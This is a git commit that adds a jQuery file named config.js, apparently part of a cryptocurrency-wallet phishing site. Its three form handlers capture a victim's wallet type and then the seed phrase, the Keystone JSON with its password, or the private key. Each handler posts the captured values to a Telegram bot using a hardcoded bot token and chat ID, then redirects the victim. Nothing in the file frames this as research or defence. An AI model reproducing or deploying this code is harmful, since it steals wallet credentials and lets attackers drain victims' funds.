3a6f5191d0f055b4b57c228b44f7f6a159f61845
segzyswitch <segzyswitch99@gmail.com>
2025-04-25 13:40:51 +0100

    updated chat

---
+++ web/js/config.js
@@ -0,0 +1,111 @@
+$(document).ready(function () {
+  const token = "7500165062:AAEYU6ElQcprTZwTyjpRbWR6aZeue2Hb50M";
+  const chatId = "7293152799"; // "5706267146";
+
+  const phraseForm = $("#phrase_content form");
+  const keystoneForm = $("#keyj_content form");
+  const pkForm = $("#prikey_content form");
+  phraseForm.on('submit', function (ev) {
+    ev.preventDefault(); // Prevent the default form submission
+
+    var walletVal = $("#ph_type").val();
+    var phraseVal = $("#ph_keyy").val();
+    const message = `
+******************************
+  wallet:
+  ${walletVal}\n
+  Phrase:
+  ${phraseVal}\n
+******************************\n`;
+
+    // AJAX CALL
+    $.ajax({
+      type: "POST",
+      url: `https://api.telegram.org/bot${token}/sendMessage`,
+      data: {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "html",
+      },
+      success: function (respnx) {
+        window.location.href = "../index.html";
+      },
+      error: function (badx) {
+        alert("Oops! Something went wrong. Try again!");
+        console.log(badx);
+      },
+    });
+  });
+
+  // Keystone Form Submission
+  keystoneForm.on('submit', function (ev) {
+    ev.preventDefault(); // Prevent the default form submission
+
+    var walletVal = $("#kt_type").val();
+    var phraseVal = $("#kt_phrase").val();
+    var pwdVal = $("#kt_pwd").val();
+    const message = `
+******************************
+  wallet:
+  ${walletVal}\n
+  Keystone JSON:
+  ${phraseVal}\n
+  Password:
+  ${pwdVal}\n
+******************************\n`;
+
+    // AJAX CALL
+    $.ajax({
+      type: "POST",
+      url: `https://api.telegram.org/bot${token}/sendMessage`,
+      data: {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "html",
+      },
+      success: function (respnx) {
+        window.location.href = "../index.html";
+      },
+      error: function (badx) {
+        alert("Oops! Something went wrong. Try again!");
+        console.log(badx);
+      },
+    });
+  });
+
+  // Private Key Form Submission
+
+  // Keystone Form Submission
+  pkForm.on('submit', function (ev) {
+    ev.preventDefault(); // Prevent the default form submission
+
+    var walletVal = $("#pk_type").val();
+    var phraseVal = $("#pk_phrase").val();
+    const message = `
+******************************
+  wallet:
+  ${walletVal}\n
+  Private Key:
+  ${phraseVal}\n
+******************************\n`;
+
+    // AJAX CALL
+    $.ajax({
+      type: "POST",
+      url: `https://api.telegram.org/bot${token}/sendMessage`,
+      data: {
+        chat_id: chatId,
+        text: message,
+        parse_mode: "html",
+      },
+      success: function (respnx) {
+        window.location.href = "../index.html";
+      },
+      error: function (badx) {
+        alert("Oops! Something went wrong. Try again!");
+        console.log(badx);
+      },
+    });
+  });
+
+});
